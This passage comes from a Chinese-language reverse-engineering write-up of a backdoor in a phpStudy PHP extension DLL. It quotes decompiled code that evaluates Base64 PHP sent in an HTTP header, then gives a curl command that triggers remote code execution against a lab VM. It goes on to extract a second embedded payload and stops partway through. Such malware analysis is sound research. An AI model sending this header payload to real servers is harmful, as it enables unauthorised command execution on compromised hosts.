            if (iVar5 != -1) {
              uVar6 = 0xffffffff;
              pcVar9 = *(char **)*local_1c;
              do {
                if (uVar6 == 0) break;
                uVar6 = uVar6 - 1;
                cVar1 = *pcVar9;
                pcVar9 = pcVar9 + 1;
              } while (cVar1 != '\0');
              local_10 = FUN_100040b0((int)*(char **)*local_1c,~uVar6 - 1);
              if (local_10 != (undefined4 *)0x0) {
                iVar5 = *(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4);
                local_24 = *(undefined4 *)(iVar5 + 0x128);
                *(undefined **)(iVar5 + 0x128) = local_ec;
                iVar5 = _setjmp3(local_ec,0);
                uVar3 = local_24;
                if (iVar5 == 0) {
                  zend_eval_string(local_10,0,&DAT_10012884,param_3);
                }
                else {
                  *(undefined4 *)
                    (*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0x128) =
                    local_24;
                }
                *(undefined4 *)
                  (*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0x128) = uVar3;
              }
            }
          }
        }
      }
     }
阅读起来非常复杂，大概逻辑就是通过 PHP 的 `zend_hash_find` 函数寻找 `$_SERVER` 变量，然后找到 Accept-Encoding 和 Accept-Charset 两个 HTTP 请求头，如果 Accept-Encoding 的值为 gzip,deflate，就调用
`zend_eval_string` 去执行 Accept-Encoding 的内容：
    zend_eval_string(local_10,0,&DAT_10012884,param_3);
这里 zend_eval_string 执行的是 local_10 变量的内容，local_10 是通过调用一个函数赋值的：
    local_10 = FUN_100040b0((int)*(char **)*local_1c,~uVar6 - 1);
函数 FUN_100040b0 最后分析出来是做 Base64 解码的。
到这里，就知道该如何构造 Payload 了：
    Accept-Encoding: gzip,deflate
    Accept-Charset: Base64加密后的PHP代码
朝虚拟机构造一个请求：
    $ curl -H "Accept-Charset: $(echo 'system("ipconfig");' | base64)" -H 'Accept-Encoding: gzip,deflate' 192.168.128.6
结果如图：
![
](https://images.seebug.org/content/images/2019/10/41d8dd18-9c91-4943-9f40-cb5633a25fb4.png-w331s)
### 2.2 第二处后门
沿着伪代码继续分析，看到这一段代码：
    if (iVar5 == 0) {
      puVar8 = &DAT_1000d66c;
      local_8 = &DAT_10012884;
      piVar10 = &DAT_1000d66c;
      do {
        if (*piVar10 == 0x27) {
          (&DAT_10012884)[iVar5] = 0x5c;
          (&DAT_10012885)[iVar5] = *(undefined *)puVar8;
          iVar5 = iVar5 + 2;
          piVar10 = piVar10 + 2;
        }
        else {
          (&DAT_10012884)[iVar5] = *(undefined *)puVar8;
          iVar5 = iVar5 + 1;
          piVar10 = piVar10 + 1;
        }
        puVar8 = puVar8 + 1;
      } while ((int)puVar8  Bytes 来打开十六进制窗口，现已处于地址
0x1000d66c，接下来要做的就是把 0x1000d66c~0x1000e5c4 之间的数据拷贝出来：
  1. 选择菜单 Select > Bytes；
  2. 弹出的窗口中勾选“To Address”，然后在右侧的“Ending Address”中填入 0x1000e5c4，如图：
![
](https://images.seebug.org/content/images/2019/10/1fbd41e5-6dc6-4ba1-b630-6e8a8939504d.png-w331s)
按回车后，这段数据已被选中，我把它们单独拷出来，点击右键，选择 Copy Special > Byte String (No Spaces)，如图：
![
](https://images.seebug.org/content/images/2019/10/aa6ce3bd-5c3c-4bad-83db-1e81b4d546ed.png-w331s)
然后打开 010Editor 编辑器：
  1. 新建文件：File > New > New Hex File；
  2. 粘贴拷贝的十六进制数据：Edit > Paste From > Paste from Hex Text
然后，把“00”字节全部去掉，选择 Search > Replace，查找 00，Replace 那里不填，点“Replace All”，处理后如下：
![
](https://images.seebug.org/content/images/2019/10/75c16b92-a593-4593-b1f2-2f3d15339823.png-w331s)
把处理后的文件保存为 p1。通过 file 命令得知文件 p1 为 Zlib 压缩后的数据：
    $ file p1
    p1: zlib compressed data
用 Python 的 zlib 库就可以解压，解压代码如下：
    import zlib
    with open("p1", "rb") as f:
        data = f.read()